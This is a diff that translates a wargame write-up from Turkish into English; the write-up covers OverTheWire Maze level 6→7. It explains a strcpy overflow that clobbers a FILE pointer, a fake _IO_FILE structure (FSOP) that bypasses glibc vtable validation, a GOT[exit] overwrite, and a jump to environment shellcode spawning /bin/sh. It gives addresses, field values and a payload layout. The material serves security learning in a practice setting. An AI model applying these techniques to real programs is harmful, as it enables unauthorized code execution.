@@ -1,73 +1,84 @@
 # OverTheWire — Maze Level 6 → 7
 
-> Hedef: `maze6`'dan `maze7` şifresi. Sonuç: **`**********`** (gizlendi)
-> Teknik: `strcpy` stack overflow ile **`FILE*` üzerine yazma (FSOP)** → sahte `FILE` ile `fprintf`'i **`GOT[exit]`'e arbitrary write** yaptırma → hemen sonraki `exit()` shellcode'a atlar (NX kapalı).
+> Goal: Get `maze7` password from `maze6`. Result: **`**********`** (hidden)
+> Technique: `strcpy` stack overflow to **overwrite `FILE*` (FSOP)** → use a fake `FILE` to make
+> `fprintf` perform an **arbitrary write to `GOT[exit]`** → the immediate `exit()` jumps to
+> shellcode (NX disabled).
 
 ---
 
-## 1. İlk Bakış
+## 1. First Look
 ```bash
 /maze/maze6 file2write2 string     # usage
 checksec: No canary | NX DISABLED | No PIE | No RELRO
 ```
 
-## 2. Analiz (sözde-kod)
+## 2. Analysis (pseudocode)
 ```c
 char buf[256];                  // [ebp-0x104]
-FILE *fp;                       // [ebp-0x4]   (buf'tan HEMEN sonra)
+FILE *fp;                       // [ebp-0x4]   (immediately after buf)
 if (argc != 3) { printf("%s file2write2 string\n", argv[0]); exit(-1); }
 fp = fopen(argv[1], "a");
-strcpy(buf, argv[2]);           // <-- OVERFLOW (sınır yok); buf+256 = fp
-memfrob(buf, strlen(buf));      // her baytı 42 (0x2a) ile XOR
+strcpy(buf, argv[2]);           // <-- OVERFLOW (no bound); buf+256 = fp
+memfrob(buf, strlen(buf));      // XOR every byte with 42 (0x2a)
 fprintf(fp, "%s : %s\n", argv[1], buf);
-exit(0);                        // <-- main RET ETMEZ
+exit(0);                        // <-- main NEVER RETURNS
 ```
 
-## 3. Zafiyetin İnceliği
-- `strcpy` ile **256 baytlık `buf` taşar**; hemen üstündeki `fp` (FILE*) ezilebilir.
-- Ama main `exit()` ile biter → **dönüş adresini ezmek işe yaramaz** (ret hiç çalışmaz).
-- Overflow'un tek anlamlı hedefi: **`fp`**. `fprintf(fp,...)` bizim sahte FILE'ımızı kullanır.
-- **No RELRO** → `GOT` yazılabilir. `fprintf`'in çıktısını **`GOT[exit]`'e** yönlendirirsek, oraya bir adres yazdırıp hemen sonraki `exit()`'i kaçırırız. **NX kapalı** → adresi env'deki shellcode'a verir, exit shellcode'a atlar.
+## 3. The Subtlety of the Vulnerability
+- `strcpy` overflows the **256-byte `buf`**; the `fp` (FILE*) immediately above it can be
+  clobbered.
+- But `main` ends with `exit()` → **overwriting the return address is useless** (ret never runs).
+- The only meaningful overflow target: **`fp`**. `fprintf(fp,...)` will use our fake FILE.
+- **No RELRO** → `GOT` is writable. If we redirect `fprintf`'s output to **`GOT[exit]`**, we
+  write an address there, and the very next `exit()` redirects to shellcode.
+  **NX disabled** → point to shellcode in the environment.
 
-## 4. Sahte FILE (FSOP) Kurgusu
-`fprintf → vfprintf → _IO_file_xsputn` yolu, FILE'ın **`_IO_write_ptr`'ından** itibaren tampona `memcpy` yapar. Yani `_IO_write_ptr = GOT[exit]` yaparsak çıktı GOT'a yazılır.
+## 4. Fake FILE (FSOP) Construction
+The `fprintf → vfprintf → _IO_file_xsputn` path does a `memcpy` starting from the FILE's
+**`_IO_write_ptr`**. So setting `_IO_write_ptr = GOT[exit]` routes the output to the GOT.
 
-Sahte 32-bit `_IO_FILE` için kritik alanlar:
-| Offset | Alan | Değer | Neden |
-|--------|------|-------|-------|
-| 0x00 | `_flags` | `0xFBAD8001` | magic + USER_LOCK (kilit atla), NO_WRITES/LINE_BUF yok |
-| 0x14 | `_IO_write_ptr` | `GOT[exit]-10` | `"argv1 : "` (10 bayt) sonrası `buf` tam GOT[exit]'e düşer |
-| 0x18 | `_IO_write_end` | büyük | bol yer → `_IO_OVERFLOW` çağrılmaz, sadece memcpy |
-| 0x46 | `_vtable_offset` | `8` | vtable'ı `0x94+8`'ten okut (0x46'daki **null'dan kaç**) |
-| 0x68 | `_mode` | `-1` | `_IO_fwide` negatif dönsün (wide moda kaymasın) |
-| 0x9c | vtable ptr | **gerçek** `_IO_file_jumps` (`0xf7faa7a8`) | glibc **vtable doğrulaması** var → sahte vtable abort eder; gerçeğini kullan |
+Critical fields for a fake 32-bit `_IO_FILE`:
+| Offset | Field | Value | Reason |
+|--------|-------|-------|--------|
+| 0x00 | `_flags` | `0xFBAD8001` | magic + USER_LOCK (skip lock), no NO_WRITES/LINE_BUF |
+| 0x14 | `_IO_write_ptr` | `GOT[exit]-10` | `"argv1 : "` (10 bytes) precedes buf, so buf lands exactly on GOT[exit] |
+| 0x18 | `_IO_write_end` | large | ample room → `_IO_OVERFLOW` not called, just memcpy |
+| 0x46 | `_vtable_offset` | `8` | read vtable from `0x94+8` (escape the **null** at 0x46) |
+| 0x68 | `_mode` | `-1` | `_IO_fwide` returns negative (don't switch to wide mode) |
+| 0x9c | vtable ptr | **real** `_IO_file_jumps` (`0xf7faa7a8`) | glibc **vtable validation** rejects fakes; use the real one |
 
-> glibc 2.39 `_IO_vtable_check` sahte vtable'ı reddeder. Çözüm: vtable'ı **gerçek** `_IO_file_jumps`'a göster (yazma için `__xsputn = _IO_file_xsputn` zaten istediğimiz memcpy'yi yapar). Sahte FILE'ı env'e koyduk; içinde null olmaması için `_vtable_offset` hilesini kullandık.
+> glibc 2.39 `_IO_vtable_check` rejects a fake vtable. Solution: point vtable to the **real**
+> `_IO_file_jumps` (its `__xsputn = _IO_file_xsputn` already does the memcpy we want). The fake
+> FILE is placed in env; the `_vtable_offset` trick avoids needing a null inside it.
 
-## 5. İki Pürüz Daha
-- **`memfrob`**: `buf`'u XOR 42 yapar. `fp` overwrite ve yazılacak baytlar `buf` içinde → **önceden frob'la** (`argv2 = image XOR 0x2a`). `memfrob` sonrası `buf = image`.
-- **Adresler**: ASLR kapalı. env'deki shellcode (`SC`) ve sahte FILE (`FF`) adreslerini, argv/env/execfn uzunlukları eşleştirilmiş 32-bit printer ile öğrendim. `GOT[exit]=0x804b208`, vtable `0xf7faa7a8` gdb ile bulundu.
+## 5. Two More Complications
+- **`memfrob`**: XORs `buf` with 42. The `fp` overwrite and the bytes to write live inside `buf`
+  → **pre-frob them** (`argv2 = image XOR 0x2a`). After `memfrob`, `buf = image`.
+- **Addresses**: ASLR off. The shellcode (`SC`) and fake FILE (`FF`) addresses in the env were
+  found with a 32-bit printer whose argv/env/execfn lengths match exactly.
+  `GOT[exit]=0x804b208`, vtable `0xf7faa7a8` found via gdb.
 
-## 6. Exploit Akışı
+## 6. Exploit Flow
 ```
-argv1 = "/tmp/m6"  (7 char; fopen "a")
-argv2 = frob( [GOT'a yazılacak: SC_target][0x00 terminator][...][buf+256 = &FF] )
-env   = { SC: NOPsled+shellcode , FF: sahte FILE }
-fp (ezilen) -> &FF
-fprintf -> "/tmp/m6 : " + 4 bayt(SC_target) yazar @ GOT[exit]
+argv1 = "/tmp/m6"  (7 chars; fopen "a")
+argv2 = frob( [bytes to write to GOT: SC_target][0x00 terminator][...][buf+256 = &FF] )
+env   = { SC: NOPsled+shellcode , FF: fake FILE }
+fp (overwritten) -> &FF
+fprintf -> writes "/tmp/m6 : " + 4 bytes(SC_target) @ GOT[exit]
 exit()  -> jmp *GOT[exit] -> shellcode (maze7) -> execve("/bin/sh")
 ```
 ```
 SC=0xffffdd1c FF=0xffffdf4b sc_target=0xffffde1c
-uid=15007(maze7) ... <maze7 şifresi>
+uid=15007(maze7) ... <maze7 password>
 ```
 
-## Dersler
-| Konu | Not |
-|------|-----|
-| `exit()` vs `ret` | main ret etmiyorsa dönüş-adresi overflow'u boşa; başka primitive (FILE*) gerekir |
-| FSOP | Kontrol edilen `FILE*` + `fprintf` = arbitrary write; `_IO_write_ptr` hedefe çevrilir |
-| glibc vtable check | Sahte vtable yasak → **gerçek** `_IO_file_jumps`'ı kullan, sadece alanları oyna |
-| No RELRO | `GOT` yazılabilir → `exit` GOT'u ezilip kontrol alınır |
-| `memfrob` | XOR 42; payload'ı önceden frob'la |
-| `_vtable_offset` | Null gerektiren `0x46` alanını sıfırlamak yerine offset'i kaydır |
+## Lessons
+| Topic | Note |
+|-------|------|
+| `exit()` vs `ret` | If main doesn't return, return-address overflow is useless; need a different primitive (FILE*) |
+| FSOP | Controlled `FILE*` + `fprintf` = arbitrary write; point `_IO_write_ptr` at target |
+| glibc vtable check | Fake vtable rejected → use the **real** `_IO_file_jumps`, just manipulate the other fields |
+| No RELRO | `GOT` writable → overwrite exit GOT entry for control |
+| `memfrob` | XOR 42; pre-frob the payload |
+| `_vtable_offset` | Shift vtable offset instead of zeroing the null-requiring `0x46` field |
